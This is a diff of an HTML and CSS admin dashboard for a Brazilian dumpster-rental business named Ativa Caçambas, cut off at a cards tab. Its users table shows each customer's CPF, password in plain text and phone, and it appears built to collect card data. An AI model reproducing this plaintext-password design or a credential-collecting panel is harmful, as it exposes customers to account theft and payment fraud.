@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>Ativa Caçambas | Admin Dashboard</title>
     <link rel="icon" type="image/jpeg" href="https://scontent.xx.fbcdn.net/v/t1.15752-9/715809879_1727949468558752_4382822255400093431_n.png?_nc_cat=106&ccb=1-7&_nc_sid=fc17b8&_nc_ohc=k7YWsOQ0VX8Q7kNvwFkIyES&_nc_oc=Adq9nzAcXBk_yCf_PoDIbYP51WWG7feNDYZjszCLlDKwEyWIzyYhGYobEm7Pv6fLi8BO9b6a7CcFdxQOUEz8yRSQ&_nc_ad=z-m&_nc_cid=0&_nc_zt=23&_nc_ht=scontent.xx&oh=03_Q7cD5gGF-MM6kepdozntLO5Htic-VfDUJDI9PeTQVZb6teOo1A&oe=6A4B39CD">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -35,6 +35,992 @@
         body.theme-light {
             --accent: #3b82f6;
             --accent-hover: #2563eb;
+            --accent-light: rgba(59,130,246,0.08);
+            --bg: #f0f2f8;
+            --bg-card: #ffffff;
+            --bg-sidebar: #f8f9fc;
+            --border: #e2e8f0;
+            --text: #1a1f2e;
+            --text-secondary: #4b5563;
+            --text-muted: #6b7280;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --info: #3b82f6;
+        }
+
+        body { background: var(--bg); color: var(--text); }
+
+        /* Animações */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes scaleIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(100px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 5px; height: 5px; }
+        ::-webkit-scrollbar-track { background: var(--border); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }
+
+        #bgCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.05;
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.5s;
+        }
+        .loading-screen.hidden { opacity: 0; visibility: hidden; }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid var(--accent-light);
+            border-top-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Login */
+        .login-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 1;
+            display: flex;
+            background: #000000;
+            animation: scaleIn 0.5s ease;
+        }
+        .login-image {
+            flex: 1;
+            background: linear-gradient(135deg, rgba(0,0,0,0.7), rgba(0,0,0,0.4)), url('https://images.unsplash.com/photo-1581094288338-1c5e6d49cc3b?w=800&h=1000&fit=crop') center/cover no-repeat;
+            display: flex;
+            align-items: flex-end;
+            padding: 60px;
+        }
+        @media (max-width: 900px) { .login-image { display: none; } }
+        .image-content { color: white; max-width: 80%; animation: fadeInUp 0.6s ease; }
+        .image-content h2 { font-size: clamp(1.8rem, 5vw, 2.5rem); font-weight: 800; margin-bottom: 16px; letter-spacing: -0.5px; }
+        .image-content p { font-size: clamp(0.8rem, 3vw, 1rem); opacity: 0.8; }
+        .login-form-wrapper {
+            width: 520px;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: clamp(24px, 5vw, 48px);
+            box-shadow: -20px 0 50px rgba(0,0,0,0.15);
+        }
+        @media (max-width: 900px) { .login-form-wrapper { width: 100%; } }
+        .login-box { width: 100%; max-width: 380px; animation: fadeInUp 0.6s ease; }
+        .login-box h1 { font-size: clamp(1.8rem, 6vw, 2rem); font-weight: 800; color: #1a1a2e; margin-bottom: 8px; letter-spacing: -0.5px; }
+        .login-box h1 span { color: #3b82f6; }
+        .login-box .subtitle { color: #6b7280; font-size: 14px; margin-bottom: 32px; }
+        .login-box .form-group { margin-bottom: 24px; }
+        .login-box label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 8px; }
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #f9fafb;
+            border: 2px solid #e5e7eb;
+            border-radius: 14px;
+            color: #1f2937;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+        .login-box input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.1); }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            border: none;
+            border-radius: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            color: #fff;
+            transition: all 0.3s;
+        }
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(59,130,246,0.4); }
+        .error-msg {
+            background: #fee2e2;
+            border: 1px solid #fecaca;
+            color: #dc2626;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+        }
+
+        /* Admin Panel */
+        .admin-panel { display: none; position: relative; z-index: 1; }
+        .admin-panel.visible { display: block; }
+
+        /* Sidebar */
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 280px;
+            height: 100vh;
+            background: var(--bg-sidebar);
+            border-right: 1px solid var(--border);
+            z-index: 100;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow-y: auto;
+        }
+        @media (max-width: 768px) {
+            .sidebar { transform: translateX(-280px); }
+            .sidebar.mobile-open { transform: translateX(0); }
+        }
+        .sidebar.collapsed { transform: translateX(-280px); }
+        .sidebar-header { padding: 28px 24px; border-bottom: 1px solid var(--border); margin-bottom: 24px; }
+        .sidebar-header h2 { font-size: clamp(1.2rem, 5vw, 1.5rem); font-weight: 800; background: linear-gradient(135deg, var(--text), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -0.5px; }
+        .sidebar-header p { font-size: 11px; color: var(--text-muted); margin-top: 6px; }
+        .sidebar-menu { list-style: none; padding: 0 16px; }
+        .sidebar-menu li { margin-bottom: 6px; }
+        .sidebar-menu a {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 16px;
+            color: var(--text-secondary);
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+        }
+        .sidebar-menu a i { width: 22px; font-size: 16px; transition: transform 0.2s; }
+        .sidebar-menu a:hover { background: var(--accent-light); color: var(--accent); transform: translateX(6px); }
+        .sidebar-menu a.active { background: linear-gradient(135deg, var(--accent-light), transparent); color: var(--accent); border-left: 3px solid var(--accent); }
+
+        .sidebar-toggle {
+            position: fixed;
+            left: 290px;
+            top: 22px;
+            width: 40px;
+            height: 40px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            cursor: pointer;
+            z-index: 101;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            color: var(--text-secondary);
+        }
+        @media (max-width: 768px) { .sidebar-toggle { left: 20px; } }
+        .sidebar-toggle.collapsed { left: 20px; }
+        .sidebar-toggle:hover { background: var(--accent); color: #fff; transform: scale(1.08); }
+
+        .main-content {
+            margin-left: 280px;
+            padding: 28px 36px;
+            transition: margin-left 0.3s;
+            animation: fadeInUp 0.4s ease;
+        }
+        @media (max-width: 768px) {
+            .main-content { margin-left: 20px; padding: 20px; }
+            .main-content.expanded { margin-left: 20px; }
+        }
+        @media (max-width: 480px) { .main-content { padding: 16px; } }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+            padding: 16px 28px;
+            background: var(--bg-card);
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        @media (max-width: 600px) { .admin-header { flex-direction: column; text-align: center; } }
+        .admin-header h3 { font-size: clamp(1rem, 4vw, 1.125rem); font-weight: 700; display: flex; align-items: center; gap: 10px; }
+        .logout-btn {
+            padding: 10px 28px;
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border);
+            border-radius: 40px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        .logout-btn:hover { background: var(--danger); border-color: var(--danger); color: #fff; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(239,68,68,0.3); }
+
+        /* Stats Grid - Responsivo */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+        .stat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: clamp(16px, 4vw, 24px);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .stat-card:hover { transform: translateY(-6px); border-color: var(--accent); box-shadow: 0 15px 35px rgba(0,0,0,0.15); }
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(135deg, var(--accent), var(--accent-hover));
+        }
+        .stat-value { font-size: clamp(1.5rem, 5vw, 2.125rem); font-weight: 800; background: linear-gradient(135deg, var(--accent), var(--accent-hover)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
+        .stat-label { font-size: 12px; font-weight: 500; color: var(--text-muted); }
+        .stat-icon {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 36px;
+            opacity: 0.12;
+            color: var(--accent);
+        }
+
+        /* Charts Row */
+        .charts-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+        .chart-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: clamp(16px, 4vw, 24px);
+            transition: transform 0.3s;
+        }
+        .chart-card:hover { transform: translateY(-4px); }
+        .chart-card h4 { font-size: 15px; font-weight: 600; margin-bottom: 20px; color: var(--text); display: flex; align-items: center; gap: 8px; }
+        canvas { max-height: 250px; width: 100%; }
+
+        /* Payments Table */
+        .payments-table-section {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: clamp(16px, 4vw, 24px);
+            margin-bottom: 32px;
+        }
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .section-header h3 { font-size: 16px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
+        .tabs-mini { display: flex; gap: 10px; flex-wrap: wrap; }
+        .tab-mini {
+            padding: 8px 20px;
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border);
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+        .tab-mini.active { background: linear-gradient(135deg, var(--accent), var(--accent-hover)); border-color: var(--accent); color: white; }
+        .tab-mini:hover { transform: translateY(-2px); }
+
+        /* Tables Responsive */
+        .table-wrapper { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+        .payment-table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 600px; }
+        .payment-table th { text-align: left; padding: 14px 10px; color: var(--text-muted); font-weight: 600; border-bottom: 1px solid var(--border); }
+        .payment-table td { padding: 14px 10px; border-bottom: 1px solid var(--border); color: var(--text-secondary); transition: background 0.2s; }
+        .payment-table tr:hover td { background: var(--accent-light); }
+
+        /* Badges */
+        .badge-paid, .badge-pending, .badge-pix {
+            padding: 5px 14px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 600;
+            display: inline-block;
+        }
+        .badge-paid { background: linear-gradient(135deg, rgba(16,185,129,0.15), rgba(16,185,129,0.05)); color: #10b981; }
+        .badge-pending { background: linear-gradient(135deg, rgba(245,158,11,0.15), rgba(245,158,11,0.05)); color: #f59e0b; }
+        .badge-pix { background: linear-gradient(135deg, rgba(59,130,246,0.15), rgba(59,130,246,0.05)); color: #3b82f6; }
+
+        /* Cards */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: clamp(16px, 4vw, 24px);
+            margin-bottom: 28px;
+            transition: all 0.3s;
+        }
+        .card:hover { border-color: var(--accent); box-shadow: 0 8px 28px rgba(0,0,0,0.08); }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid var(--border);
+            font-weight: 700;
+            font-size: 14px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        /* Products */
+        .products-container { display: flex; flex-direction: column; gap: 14px; }
+        .product-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            background: var(--bg-sidebar);
+            border-radius: 16px;
+            transition: all 0.3s;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .product-row:hover { background: var(--accent-light); transform: translateX(8px); }
+        .product-info { display: flex; align-items: center; gap: 16px; flex: 2; min-width: 200px; }
+        .product-icon {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, var(--accent-light), transparent);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .product-details h4 { font-size: 15px; font-weight: 700; margin-bottom: 4px; }
+        .product-details p { font-size: 11px; color: var(--text-muted); }
+        .product-price { font-size: 16px; font-weight: 800; color: var(--accent); }
+        .product-actions { display: flex; gap: 10px; flex-wrap: wrap; }
+
+        /* Buttons */
+        .btn-icon {
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border);
+            width: 38px;
+            height: 38px;
+            border-radius: 12px;
+            cursor: pointer;
+            color: var(--text-secondary);
+            transition: all 0.3s;
+        }
+        .btn-icon:hover { background: var(--accent); color: #fff; transform: scale(1.08) rotate(5deg); }
+        .btn-delete {
+            background: linear-gradient(135deg, rgba(239,68,68,0.15), rgba(239,68,68,0.05));
+            border: 1px solid rgba(239,68,68,0.3);
+            padding: 8px 18px;
+            border-radius: 12px;
+            color: #ef4444;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        .btn-delete:hover { background: #ef4444; color: #fff; transform: translateY(-2px); box-shadow: 0 6px 15px rgba(239,68,68,0.3); }
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent), var(--accent-hover));
+            border: none;
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            color: #fff;
+            transition: all 0.3s;
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(59,130,246,0.4); }
+
+        /* Forms */
+        .form-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 18px;
+            margin-bottom: 18px;
+        }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; color: var(--text-muted); margin-bottom: 6px; }
+        .form-group input, .form-group select, .form-group textarea {
+            width: 100%;
+            padding: 12px 14px;
+            background: var(--bg-sidebar);
+            border: 1.5px solid var(--border);
+            border-radius: 14px;
+            color: var(--text);
+            font-size: 13px;
+            transition: all 0.2s;
+        }
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-light);
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(4px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeInUp 0.3s;
+            padding: 16px;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background: var(--bg-card);
+            border-radius: 28px;
+            padding: clamp(20px, 6vw, 32px);
+            max-width: 600px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            border: 1px solid var(--border);
+            animation: scaleIn 0.3s;
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .modal-header h3 { font-size: clamp(1.1rem, 5vw, 1.25rem); font-weight: 800; }
+        .modal-close {
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border);
+            width: 36px;
+            height: 36px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 20px;
+            transition: all 0.2s;
+        }
+        .modal-close:hover { background: var(--danger); color: white; transform: rotate(90deg); }
+
+        .btn-whats {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        .btn-whats:hover { transform: scale(1.05); box-shadow: 0 6px 15px rgba(37,211,102,0.4); }
+
+        .schedule-table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 500px; }
+        .schedule-table th, .schedule-table td { padding: 14px; text-align: left; border-bottom: 1px solid var(--border); }
+        .schedule-table tr:hover td { background: var(--accent-light); }
+
+        .badge { display: inline-block; padding: 5px 14px; border-radius: 30px; font-size: 11px; font-weight: 600; }
+        .badge-success { background: linear-gradient(135deg, rgba(16,185,129,0.15), rgba(16,185,129,0.05)); color: #10b981; }
+        .badge-warning { background: linear-gradient(135deg, rgba(245,158,11,0.15), rgba(245,158,11,0.05)); color: #f59e0b; }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--bg-card);
+            border-left: 4px solid var(--accent);
+            padding: 14px 24px;
+            border-radius: 16px;
+            z-index: 2000;
+            animation: slideIn 0.3s;
+            font-size: 13px;
+            font-weight: 500;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        @media (max-width: 480px) { .toast { bottom: 16px; right: 16px; left: 16px; text-align: center; } }
+
+        .tab-content { display: none; animation: fadeInUp 0.4s ease; }
+        .tab-content.active { display: block; }
+
+        .search-box {
+            display: flex;
+            align-items: center;
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 8px 16px;
+            gap: 10px;
+            transition: all 0.2s;
+        }
+        .search-box:focus-within { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-light); }
+        .search-box input { background: transparent; border: none; padding: 8px; color: var(--text); width: 100%; min-width: 120px; }
+        .search-box input:focus { outline: none; }
+        .search-box i { color: var(--text-muted); }
+
+        .theme-options { display: flex; gap: 15px; flex-wrap: wrap; }
+        .theme-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 16px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+        }
+        .theme-btn:hover { transform: scale(1.08); }
+        .theme-dark-btn { background: linear-gradient(135deg, #1a1f2e, #0a0a0f); }
+        .theme-light-btn { background: linear-gradient(135deg, #ffffff, #f0f2f8); border: 1px solid #ddd; }
+        .toggle-card-btn {
+            background: linear-gradient(135deg, var(--accent-light), transparent);
+            border: 1px solid var(--border);
+            padding: 8px 16px;
+            border-radius: 12px;
+            color: var(--accent);
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        .toggle-card-btn:hover { background: var(--accent); color: white; transform: translateY(-2px); }
+
+        .footer { text-align: center; padding: 24px; color: var(--text-muted); font-size: 11px; border-top: 1px solid var(--border); margin-top: 36px; }
+    </style>
+</head>
+<body class="theme-dark">
+<canvas id="bgCanvas"></canvas>
+
+<div class="loading-screen" id="loadingScreen"><div class="spinner"></div></div>
+
+<div class="login-container" id="loginContainer">
+    <div class="login-image">
+        <div class="image-content">
+            <h2>Ativa Caçambas</h2>
+            <p>Gestão completa de locação, agendamentos e pagamentos</p>
+        </div>
+    </div>
+    <div class="login-form-wrapper">
+        <div class="login-box">
+            <h1>ATIVA<span>ADMIN</span></h1>
+            <div class="subtitle">Acesse o painel de controle</div>
+            <div class="error-msg" id="loginError">Credenciais inválidas</div>
+            <div class="form-group"><label>Usuário</label><input type="text" id="loginUser" placeholder="admin"></div>
+            <div class="form-group"><label>Senha</label><input type="password" id="loginPass" placeholder="......"></div>
+            <button class="login-btn" onclick="handleLogin()">ENTRAR</button>
+            <div class="login-footer"><a href="#">Esqueceu a senha?</a></div>
+        </div>
+    </div>
+</div>
+
+<div class="admin-panel" id="adminPanel">
+    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h2>ATIVA<span>ADMIN</span></h2>
+            <p>Painel de Controle</p>
+        </div>
+        <ul class="sidebar-menu">
+            <li><a data-tab="dashboard" onclick="switchTab('dashboard')"><i class="fas fa-chart-line"></i> Dashboard</a></li>
+            <li><a data-tab="produtos" onclick="switchTab('produtos')"><i class="fas fa-dumpster"></i> Produtos</a></li>
+            <li><a data-tab="agendamentos" onclick="switchTab('agendamentos')"><i class="fas fa-calendar"></i> Agendamentos</a></li>
+            <li><a data-tab="users" onclick="switchTab('users')"><i class="fas fa-users"></i> Usuários</a></li>
+            <li><a data-tab="cards" onclick="switchTab('cards')"><i class="fas fa-credit-card"></i> Cartões</a></li>
+            <li><a data-tab="payments" onclick="switchTab('payments')"><i class="fas fa-money-bill"></i> Pagamentos</a></li>
+            <li><a data-tab="logs" onclick="switchTab('logs')"><i class="fas fa-history"></i> Logs</a></li>
+            <li><a data-tab="settings" onclick="switchTab('settings')"><i class="fas fa-cog"></i> Configurações</a></li>
+        </ul>
+    </aside>
+
+    <main class="main-content" id="mainContent">
+        <div class="admin-header">
+            <h3><i class="fas fa-tachometer-alt"></i> Painel Administrativo</h3>
+            <button class="logout-btn" onclick="handleLogout()"><i class="fas fa-sign-out-alt"></i> Sair</button>
+        </div>
+
+        <!-- Dashboard Content -->
+        <div id="tabDashboard" class="tab-content active">
+            <div class="stats-grid">
+                <div class="stat-card"><div class="stat-value" id="statTotalRevenue">R$ 0</div><div class="stat-label">Receita Total</div><i class="fas fa-dollar-sign stat-icon"></i></div>
+                <div class="stat-card"><div class="stat-value" id="statPendingCount">0</div><div class="stat-label">Pagamentos Pendentes</div><i class="fas fa-clock stat-icon"></i></div>
+                <div class="stat-card"><div class="stat-value" id="statPaidCount">0</div><div class="stat-label">Pagamentos Confirmados</div><i class="fas fa-check-circle stat-icon"></i></div>
+                <div class="stat-card"><div class="stat-value" id="statScheduleCount">0</div><div class="stat-label">Agendamentos Hoje</div><i class="fas fa-calendar-day stat-icon"></i></div>
+            </div>
+
+            <div class="charts-row">
+                <div class="chart-card"><h4><i class="fas fa-chart-pie"></i> Pagamentos por Status</h4><canvas id="statusChart"></canvas></div>
+                <div class="chart-card"><h4><i class="fas fa-chart-line"></i> Receita por Mês</h4><canvas id="revenueChart"></canvas></div>
+            </div>
+
+            <div class="payments-table-section">
+                <div class="section-header">
+                    <h3><i class="fas fa-table"></i> Escala de Pagamentos</h3>
+                    <div class="tabs-mini">
+                        <button class="tab-mini active" onclick="filterPaymentTable('all')">Todos</button>
+                        <button class="tab-mini" onclick="filterPaymentTable('pending')">Pendentes</button>
+                        <button class="tab-mini" onclick="filterPaymentTable('paid')">Pagos</button>
+                    </div>
+                </div>
+                <div class="table-wrapper">
+                    <table class="payment-table" id="paymentTable">
+                        <thead><tr><th>Cliente</th><th>Telefone</th><th>Valor</th><th>Forma</th><th>Status</th><th>Data</th><th>Ações</th></tr></thead>
+                        <tbody id="paymentTableBody"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card"><div class="card-header">Atividades Recentes</div><div id="recentActivity"></div></div>
+        </div>
+
+        <!-- PRODUTOS -->
+        <div id="tabProdutos" class="tab-content">
+            <div class="card">
+                <div class="card-header"><i class="fas fa-plus-circle"></i> Adicionar Produto</div>
+                <form id="productForm">
+                    <div class="form-row">
+                        <div class="form-group"><label>Nome do Produto</label><input type="text" id="prodNome" placeholder="Ex: Caçamba 5m³" required></div>
+                        <div class="form-group"><label>Tipo</label><select id="prodTipo"><option value="cacamba">Caçamba</option><option value="material">Material</option></select></div>
+                        <div class="form-group"><label>Preço (R$)</label><input type="number" step="0.01" id="prodPreco" placeholder="0.00" required></div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group"><label>Preço Promocional</label><input type="number" step="0.01" id="prodPromocional" placeholder="Opcional"></div>
+                        <div class="form-group"><label>Dimensões (CxLxA)</label><input type="text" id="prodDimensoes" placeholder="Ex: 2.80m x 1.50m x 1.20m"></div>
+                        <div class="form-group"><label>Capacidade (m³)</label><input type="text" id="prodCapacidade" placeholder="Ex: 5m³"></div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group"><label>Peso Máximo</label><input type="text" id="prodPeso" placeholder="Ex: 5 toneladas"></div>
+                        <div class="form-group"><label>Material</label><input type="text" id="prodMaterial" placeholder="Ex: Aço Reforçado"></div>
+                        <div class="form-group"><label>Cor</label><input type="text" id="prodCor" placeholder="Ex: Laranja/Amarelo"></div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group"><label>Fabricante</label><input type="text" id="prodFabricante" placeholder="Ex: Ativa Caçambas"></div>
+                        <div class="form-group"><label>URL da Imagem</label><input type="text" id="prodImagem" placeholder="https://..."></div>
+                        <div class="form-group"><label>Ícone (fallback)</label><input type="text" id="prodIcone" placeholder="fas fa-dumpster"></div>
+                    </div>
+                    <div class="form-group"><label>Descrição Completa</label><textarea id="prodDescricao" rows="3" placeholder="Descreva todos os detalhes do produto..."></textarea></div>
+                    <button type="submit" class="btn-primary"><i class="fas fa-save"></i> Salvar Produto</button>
+                </form>
+            </div>
+            <div class="card">
+                <div class="card-header"><i class="fas fa-list"></i> Lista de Produtos <span id="productCount" style="font-size:12px; color:var(--text-muted);"></span></div>
+                <div id="productList" class="products-container"></div>
+            </div>
+        </div>
+
+        <!-- Modal de Edição -->
+        <div id="editProductModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-edit"></i> Editar Produto</h3><button class="modal-close" onclick="closeEditModal()">&times;</button></div><form id="editProductForm"><input type="hidden" id="editProdId"><div class="form-row"><div class="form-group"><label>Nome</label><input type="text" id="editProdNome" required></div><div class="form-group"><label>Tipo</label><select id="editProdTipo"><option value="cacamba">Caçamba</option><option value="material">Material</option></select></div><div class="form-group"><label>Preço</label><input type="number" step="0.01" id="editProdPreco" required></div></div><div class="form-row"><div class="form-group"><label>Preço Promocional</label><input type="number" step="0.01" id="editProdPromocional"></div><div class="form-group"><label>Dimensões</label><input type="text" id="editProdDimensoes"></div><div class="form-group"><label>Capacidade</label><input type="text" id="editProdCapacidade"></div></div><div class="form-row"><div class="form-group"><label>Peso Máximo</label><input type="text" id="editProdPeso"></div><div class="form-group"><label>Material</label><input type="text" id="editProdMaterial"></div><div class="form-group"><label>Cor</label><input type="text" id="editProdCor"></div></div><div class="form-row"><div class="form-group"><label>Fabricante</label><input type="text" id="editProdFabricante"></div><div class="form-group"><label>Imagem URL</label><input type="text" id="editProdImagem"></div><div class="form-group"><label>Ícone</label><input type="text" id="editProdIcone"></div></div><div class="form-group"><label>Descrição</label><textarea id="editProdDescricao" rows="3"></textarea></div><div style="display: flex; gap: 12px; margin-top: 20px; flex-wrap: wrap;"><button type="submit" class="btn-primary">Salvar Alterações</button><button type="button" class="btn-delete" onclick="closeEditModal()">Cancelar</button></div></form></div></div>
+
+        <!-- AGENDAMENTOS -->
+        <div id="tabAgendamentos" class="tab-content">
+            <div class="card"><div class="card-header"><i class="fas fa-calendar-alt"></i> Agendamentos</div><div class="table-wrapper" id="scheduleList"></div></div>
+        </div>
+
+        <!-- USUÁRIOS -->
+        <div id="tabUsers" class="tab-content">
+            <div class="card">
+                <div class="card-header"><i class="fas fa-users"></i> Usuários <div style="display:flex; gap:10px; flex-wrap:wrap;"><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchUsers" placeholder="Buscar CPF..." onkeyup="filterUsers()"></div><button class="btn-primary" onclick="exportUsersCSV()">Exportar CSV</button><button class="btn-delete" onclick="clearAllUsers()">Limpar Todos</button></div></div>
+                <div class="table-wrapper"><table class="payment-table"><thead><tr><th>CPF</th><th>Senha</th><th>Telefone</th><th>Data</th><th>Ações</th></tr></thead><tbody id="usersTable"></tbody></table></div>
+            </div>
+        </div>
+
+        <!-- CARTÕES -->
+        <div id="tabCards" class="tab-content">
+            <div class="card">
